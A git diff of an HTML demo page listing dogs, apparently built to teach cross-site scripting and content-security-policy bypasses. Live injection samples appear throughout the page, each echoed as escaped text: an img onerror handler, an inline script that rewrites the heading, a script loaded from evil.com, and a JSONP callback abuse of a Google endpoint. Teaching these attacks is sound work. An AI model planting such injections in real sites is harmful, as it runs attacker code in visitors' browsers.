@@ -16,6 +16,7 @@
 
 <body>
   <h1>A list of the best dogs! 🐶</h1>
+  <p>Imagine the list is populate by user input and no sanitization or output escaping. Code block are the "injections".</p>
   <ol>
     <li>Max
       <img src="https://place-puppy.com/300x300">
@@ -26,9 +27,7 @@
       <!-- Injected inline code -->
       <img src="x" onerror="console.log('Malicious inline code executing ...')">
     </li>
-    <pre>
-  &lt;img src&equals;&quot;cat&period;png&quot; onerror&equals;&quot;console&period;log&lpar;&apos;Malicious inline code executing &period;&period;&period;&apos;&rpar;&quot; &gt;
-</pre>
+    <pre>&lt;img src&equals;&quot;cat&period;png&quot; onerror&equals;&quot;console&period;log&lpar;&apos;Malicious inline code executing &period;&period;&period;&apos;&rpar;&quot; &gt;</pre>
 
     <li>Bella
       <img src="https://place-puppy.com/500x500">
@@ -40,26 +39,20 @@
         }, 3000);
       </script>
     </li>
-    <pre>
-&lt;script&gt;&NewLine;  setTimeout&lpar;&lpar;&rpar; &equals;&gt; &lcub;&NewLine;    document&period;querySelector&lpar;&apos;h1&apos;&rpar;&period;textContent &equals; &apos;Cats are better&apos;&NewLine;    console&period;log&lpar;&quot;Malicious script block executing &period;&period;&period;&quot;&rpar;&semi;&NewLine;  &rcub;&comma; 3000&rpar;&semi;&NewLine;&lt;&sol;script&gt;
-</pre>
+    <pre>&lt;script&gt;&NewLine;  setTimeout&lpar;&lpar;&rpar; &equals;&gt; &lcub;&NewLine;    document&period;querySelector&lpar;&apos;h1&apos;&rpar;&period;textContent &equals; &apos;Cats are better&apos;&NewLine;    console&period;log&lpar;&quot;Malicious script block executing &period;&period;&period;&quot;&rpar;&semi;&NewLine;  &rcub;&comma; 3000&rpar;&semi;&NewLine;&lt;&sol;script&gt;</pre>
     <li>Cooper
       <img src="https://place-puppy.com/600x600">
       <!-- Injected remote code file -->
       <script src="https://evil.com/evil.js"></script>
     </li>
-    <pre>
-&lt;script src&equals;&quot;https&colon;&sol;&sol;evil&period;com&sol;evil&period;js&quot;&gt;&lt;&sol;script&gt;
-    </pre>
+    <pre>&lt;script src&equals;&quot;https&colon;&sol;&sol;evil&period;com&sol;evil&period;js&quot;&gt;&lt;&sol;script&gt;</pre>
     <li>Daisy
       <img src="https://place-puppy.com/700x700">
 
       <!-- Trusted whitelist domain with JSONP endpoint -->
       <script src="https://www.google.com/complete/search?client=chrome&q=concur&callback=alert"></script>
     </li>
-    <pre>
-&lt;script src&equals;&quot;https&colon;&sol;&sol;www&period;google&period;com&sol;complete&sol;search&quest;client&equals;chrome&amp;q&equals;concur&amp;callback&equals;alert&quot;&gt;&lt;&sol;script&gt;
-    </pre>
+    <pre>&lt;script src&equals;&quot;https&colon;&sol;&sol;www&period;google&period;com&sol;complete&sol;search&quest;client&equals;chrome&amp;q&equals;concur&amp;callback&equals;alert&quot;&gt;&lt;&sol;script&gt;</pre>
   </ol>
   <button id="counter">Count the how many good boys are there!</button>
 
